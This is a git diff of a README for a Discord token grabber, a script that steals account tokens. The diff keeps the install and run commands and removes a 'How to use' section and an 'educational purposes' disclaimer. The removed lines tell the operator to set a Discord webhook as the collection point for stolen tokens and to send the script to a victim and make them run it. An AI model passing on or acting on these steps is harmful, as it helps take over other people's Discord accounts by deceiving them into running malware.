@@ -54,16 +54,8 @@ $ pip3 install -r requirements.txt
 $ python astraahome.py
 ```
 
-# How to use
- 1. Create a webhook on your Discord server. I recommend creating a new server.
- 2. Change the 'WEBHOOK_URL' variable value in line 184 to your Discord webhook URL in [token_grabber.py](token_grabber.py).
- 3. Send the script to your victim and make them run it.
-
 # Example
 ![tokengrabber_example.png](https://cdn.discordapp.com/attachments/778283706388709376/880756048208740373/toest_censored.jpg)
-
-# Caution
-This script is for educational purposes. I am in no way responsible for any inconvenience.
 
 # Credits
 [<img src='https://cdn.jsdelivr.net/npm/simple-icons@3.0.1/icons/github.svg' alt='github' height='25'>](https://github.com/AstraaDev)          [<img src='https://cdn.jsdelivr.net/npm/simple-icons@3.0.1/icons/twitter.svg' alt='twitter' height='25'>](https://twitter.com/AstraaDev)          [<img src='https://cdn.jsdelivr.net/npm/simple-icons@3.0.1/icons/icloud.svg' alt='website' height='25'>](http://astraadev.club)  
